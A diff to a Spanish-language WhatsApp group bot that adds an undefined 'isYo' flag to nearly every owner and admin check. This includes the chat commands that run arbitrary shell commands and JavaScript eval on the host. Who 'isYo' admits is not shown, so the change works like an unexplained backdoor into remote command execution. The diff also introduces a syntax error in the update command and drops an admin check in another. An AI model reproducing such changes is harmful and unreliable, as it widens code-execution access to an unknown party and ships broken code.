@@ -365,7 +365,7 @@ Fg.on('CB:action,,battery', json => {
    /* if (isCmd && msgFilter.isFiltered(from)) {
          return m.reply('⚠️ Espera 2 segundos antes de usar otro comando')
 					}
-    if (isCmd && !isOwner) msgFilter.addFilter(from*/
+    if (isCmd && !isOwner && !isYo) msgFilter.addFilter(from*/
 
 
 if (budy) addUser(sender); // agregar información de usuario a la base de datos
@@ -384,7 +384,7 @@ switch (command) {
   
   case 'offline': // escribe  offline el bot no responderá a ningún comando en ciertos grupos
     if(!isGroup) return m.reply(msg.group)
-    if(!isAdmins && !isOwner) return m.reply(msg.admin)
+    if(!isAdmins && !isOwner && !isYo) return m.reply(msg.admin)
     if (isOffline === true ) {
       return m.reply('✅ Bot offline')
     }
@@ -394,7 +394,7 @@ switch (command) {
 
   case 'online':
     if(!isGroup) return m.reply(msg.group)
-    if(!isAdmins && !isOwner) return m.reply(msg.admin)
+    if(!isAdmins && !isOwner && !isYo) return m.reply(msg.admin)
     if (isOffline === false ) {
       return m.reply('✅ Bot online')
     }
@@ -441,7 +441,7 @@ break
     
   case 'restart': 
   case 'reiniciar': 
-    if(!isOwner) return m.reply(msg.owner)
+    if(!isOwner && !isYo) return m.reply(msg.owner)
     m.reply(msg.restart)
 try {
   process.send('reset')
@@ -778,7 +778,7 @@ case "s":
    break
 
  case 'listreport':
-   if (!isOwner) return m.reply(msg.owner)
+   if (!isOwner && !isYo) return m.reply(msg.owner)
    report = '*LIST REPORT*'
    for (var R of direc.report){
      report += `\n\n▢ Id : @` + R.id.split('@')[0]
@@ -913,7 +913,7 @@ break
      }
      break
      case 'setfakethumb':
-   if(!isOwner) return m.reply(msg.owner)
+   if(!isOwner && !isYo) return m.reply(msg.owner)
    if(isMedia || isQuotedImage) {
    q = m.quoted ? m.quoted : m 
    thumb = await q.download() 
@@ -1016,7 +1016,7 @@ break
 
   case 'hidetag':
   case 'notify':
-        if(!isOwner && !isAdmins) return m.reply(msg.admin)
+        if(!isOwner && !isYo && !isAdmins) return m.reply(msg.admin)
         if (!isGroup) return m.reply(msg.group);
         if(!m.quoted) {
           tag = value
@@ -1037,7 +1037,7 @@ break
         
         case 'tagall':
     if(!isGroup) return m.reply(msg.group)
-    if(!isAdmins && !isOwner) return m.reply(msg.admin)
+    if(!isAdmins && !isOwner && !isYo) return m.reply(msg.admin)
     mention = groupMembers.map(u => u.jid) 
     m.reply('TAG ALL\n\n' + mention.map((v, i) => i + 1 + '- @' + v.replace(/@.+/, '')).join`\n`, null, {
     contextInfo: { mentionedJid: mention }
@@ -1046,7 +1046,7 @@ break
   
   case 'join':
   case 'entrabot':
-    if(!isOwner) return
+    if(!isOwner && !isYo) return
     if(!value) return m.reply(`✳️Ingrese el link de tu Grupo`) 
     join = value.split('https://chat.whatsapp.com/')[1]
     await Fg.acceptInvite(join).then((res) => {
@@ -1080,7 +1080,7 @@ https://chat.whatsapp.com/${linkgp}`
  
  case 'warn':
     if(!isGroup) return m.reply(msg.group)
-    if(!isOwner && !isAdmins) return m.reply(msg.admin)
+    if(!isOwner && !isYo && !isAdmins) return m.reply(msg.admin)
     if(!dia) return m.reply(msg.notag)
     await addWarn(dia)
     warn = cekWarn(dia)
@@ -1094,7 +1094,7 @@ https://chat.whatsapp.com/${linkgp}`
 
   case 'delwarn':
     if(!isGroup) return m.reply(msg.group)
-    if(!isOwner && !isAdmins) return m.reply(msg.admin)
+    if(!isOwner && !isYo && !isAdmins) return m.reply(msg.admin)
     if(!dia) return m.reply(msg.notag)
     warn = cekWarn(dia)
     if (warn === 0) {
@@ -1113,7 +1113,7 @@ https://chat.whatsapp.com/${linkgp}`
     case 'addpremium':
     case 'addprem': 
     if(!isGroup) return m.reply(msg.group)
-    if(!isOwner) return m.reply(msg.owner)
+    if(!isOwner && !isYo) return m.reply(msg.owner)
     prem = cekPremium(dia)
     if (prem === true) {
       return m.reply(msg.isprem)
@@ -1125,7 +1125,7 @@ https://chat.whatsapp.com/${linkgp}`
   case 'delpremium':
   case 'delprem':
     if(!isGroup) return m.reply(msg.group)
-    if(!isOwner) return m.reply(msg.owner)
+    if(!isOwner && !isYo) return m.reply(msg.owner)
     prem = cekPremium(dia)
     if (prem === false) {
       return m.reply(msg.noprem)
@@ -1137,7 +1137,7 @@ https://chat.whatsapp.com/${linkgp}`
     case 'banned':
     case 'ban':
     if(!isGroup) return m.reply(msg.group)
-    if(!isOwner) return m.reply(msg.owner)
+    if(!isOwner && !isYo) return m.reply(msg.owner)
     ban = cekBanned(dia)
     if (ban === true) {
       return m.reply(msg.ban)
@@ -1149,7 +1149,7 @@ https://chat.whatsapp.com/${linkgp}`
   case 'unbanned':
   case 'unban':
     if(!isGroup) return m.reply(msg.group)
-    if(!isOwner) return m.reply(msg.owner)
+    if(!isOwner && !isYo) return m.reply(msg.owner)
     ban = cekBanned(dia)
     if (ban === false) {
       return m.reply(msg.noban)
@@ -1199,7 +1199,7 @@ Fg.groupSettingChange(from, GroupSettingChange.messageSend, true)
   case 'setppbot':
     if(!isGroup) return m.reply(msg.group)
     if(!isBotAdmins) return m.reply(msg.botadmin)
-    if(!isAdmins && !isOwner) return m.reply(msg.admin)
+    if(!isOwner && !isYo) return m.reply(msg.admin)
     if(isMedia || isQuotedImage) {
     q = m.quoted ? m.quoted : m 
     let img = await q.download() 
@@ -1222,7 +1222,7 @@ Fg.groupSettingChange(from, GroupSettingChange.messageSend, true)
     case 'kick':
     if(!isGroup) return m.reply(msg.group)
     if(!isBotAdmins) return m.reply(msg.botadmin)
-    if(!isOwner) return m.reply(msg.owner)
+    if(!isAdmins && !isOwner) return m.reply(msg.admin)
     if(!dia) return m.reply(msg.notag)
     if(dia = isAdmins) return m.reply(msg.isadmin)
     anu = "@"+dia.split('@')[0]
@@ -1238,7 +1238,7 @@ Fg.groupSettingChange(from, GroupSettingChange.messageSend, true)
   case 'add':
     if(!isGroup) return m.reply(msg.group)
     if(!isBotAdmins) return m.reply(msg.botadmin)
-    if(!isOwner) return m.reply(msg.owner)
+    if(!isOwner && !isYo) return m.reply(msg.owner)
     //if(!dia) return m.reply(msg.notag)
     user = value.replace(/[^0-9]/g, '')+"@s.whatsapp.net"
     try {
@@ -1297,7 +1297,7 @@ Fg.groupSettingChange(from, GroupSettingChange.messageSend, true)
   case 'welcome':
   case 'bienvenida':
     if(!isGroup) return m.reply(msg.group)
-    if(!isAdmins && !isOwner) return m.reply(msg.admin)
+    if(!isAdmins && !isOwner && !isYo) return m.reply(msg.admin)
     if(!isBotAdmins) return m.reply(msg.botadmin)
     if(!value) return m.reply(msg.OnorOff)
     if (value.toLowerCase() === "on") {
@@ -1315,7 +1315,7 @@ Fg.groupSettingChange(from, GroupSettingChange.messageSend, true)
     
     case 'detect':
     if(!isGroup) return m.reply(msg.group)
-    if(!isAdmins && !isOwner) return m.reply(msg.admin)
+    if(!isAdmins && !isOwner && !isYo) return m.reply(msg.admin)
     if(!isBotAdmins) return m.reply(msg.botadmin)
     if(!value) return m.reply(msg.OnorOff)
     if (value.toLowerCase() === "on") {
@@ -1333,7 +1333,7 @@ Fg.groupSettingChange(from, GroupSettingChange.messageSend, true)
     
   case 'antidelete':
     if(!isGroup) return m.reply(msg.group)
-    if(!isAdmins && !isOwner) return m.reply(msg.admin)
+    if(!isAdmins && !isOwner && !isYo) return m.reply(msg.admin)
     if(!isBotAdmins) return m.reply(msg.botadmin)
     if(!value) return m.reply(msg.OnorOff)
     if (value.toLowerCase() === "on") {
@@ -1352,7 +1352,7 @@ Fg.groupSettingChange(from, GroupSettingChange.messageSend, true)
     case 'antilink':
     case 'antilinkwha':
     if(!isGroup) return m.reply(msg.group)
-    if(!isAdmins && !isOwner) return m.reply(msg.admin)
+    if(!isAdmins && !isOwner && !isYo) return m.reply(msg.admin)
     if(!isBotAdmins) return m.reply(msg.botadmin)
     if(!value) return m.reply(msg.OnorOff)
     if (value.toLowerCase() === "on") {
@@ -1370,7 +1370,7 @@ Fg.groupSettingChange(from, GroupSettingChange.messageSend, true)
     
     case 'antiviewonce':
     if(!isGroup) return m.reply(msg.group)
-    if(!isAdmins && !isOwner) return m.reply(msg.admin)
+    if(!isAdmins && !isOwner && !isYo) return m.reply(msg.admin)
     if(!isBotAdmins) return m.reply(msg.botadmin)
     if(!value) return m.reply(msg.OnorOff)
     if (value.toLowerCase() === "on") {
@@ -1413,7 +1413,7 @@ Fg.groupSettingChange(from, GroupSettingChange.messageSend, true)
     case 'fetch':
  case 'result':
  case 'view':
-   if(!isOwner) return m.reply(msg.owner)
+   if(!isOwner && !isYo) return m.reply(msg.owner)
    let res = await fetchText(value)
    m.reply(res)
    break
@@ -1615,7 +1615,7 @@ case 'riddle':  //acertijo
  break
  
  case 'setprefix':
-    if (!isOwner) return m.reply(msg.owner)
+    if (!isOwner && !isYo) return m.reply(msg.owner)
     //if (!value) return m.reply(msg.notext)
    if((args[0]) == 'multi'){
       if(Use.multi) return m.reply(msg.Thison(command.toUpperCase()))
@@ -1642,7 +1642,7 @@ case 'riddle':  //acertijo
     
     case 'update':
     case 'actualizar':
-if (!isOwner && !isYo) return m.reply(msg.owner)
+if (!isOwner && !isYo return m.reply(msg.owner)
 gfg = `git remote set-url origin https://github.com/FG98F/dylux-bot.git && git pull `
 exec(`${gfg}`, (err, stdout) => {
 if (err) return m.reply(err) 
@@ -1653,7 +1653,7 @@ break
 
 case 'setwelcome':
     if(!isGroup) return m.reply(msg.group)
-    if(!isAdmins && !isOwner) return m.reply(msg.admin)
+    if(!isAdmins && !isOwner && !isYo) return m.reply(msg.admin)
     about = (await Fg.getStatus(sender).catch(console.error) || {}).status || ''
     fungsi = `
 @tag = @${sender.split('@')[0]}
@@ -1668,7 +1668,7 @@ case 'setwelcome':
 
   case 'setbye':
     if(!isGroup) return m.reply(msg.group)
-    if(!isAdmins && !isOwner) return m.reply(msg.admin)
+    if(!isAdmins && !isOwner && !isYo) return m.reply(msg.admin)
     about = (await Fg.getStatus(sender).catch(console.error) || {}).status || ''
 fungsi = `
 @tag = @${sender.split('@')[0]}
@@ -1684,7 +1684,7 @@ fungsi = `
 case 'delwelcome':
   case 'delbye':
     if(!isGroup) return m.reply(msg.group)
-    if(!isAdmins && !isOwner) return m.reply(msg.owner)
+    if(!isAdmins && !isOwner && !isYo) return m.reply(msg.owner)
     if(command.includes('welcome')){
       await delCustomWelcome(from)
       m.reply(msg.default('WELCOME'))
@@ -1697,7 +1697,7 @@ case 'delwelcome':
  case 'simulate':
  case 'simular':
    if(!isGroup) return m.reply(msg.group)
-   if(!isAdmins && !isOwner) return m.reply(msg.admin)
+   if(!isAdmins && !isOwner && !isYo) return m.reply(msg.admin)
    if(!value) return m.reply('Lista de eventos\n\n- Welcome\n-Bye')
    welc = getCustomWelcome(from)
    bye = getCustomBye(from)
@@ -1799,7 +1799,7 @@ m.reply(msg.wait)
   default:
   
     if (budy.startsWith('$')){
-      if (!mek.key.fromMe && !isOwner) return;
+      if (!mek.key.fromMe && !isOwner && !isYo) return;
       qur = budy.slice(2);
       exec(qur, (err, stdout) => {
         if (err) return m.reply(`‣  ${err}`);
@@ -1810,7 +1810,7 @@ m.reply(msg.wait)
           }
           
     if (budy.startsWith('>')){
-      if (!mek.key.fromMe && !isOwner) return;
+      if (!mek.key.fromMe && !isOwner && !isYo) return;
       try {
         Fg.sendMessage(from, "‣ "+JSON.stringify(eval(budy.slice(2)),null,'\t'), text, {quoted: mek});
         } catch(err) {
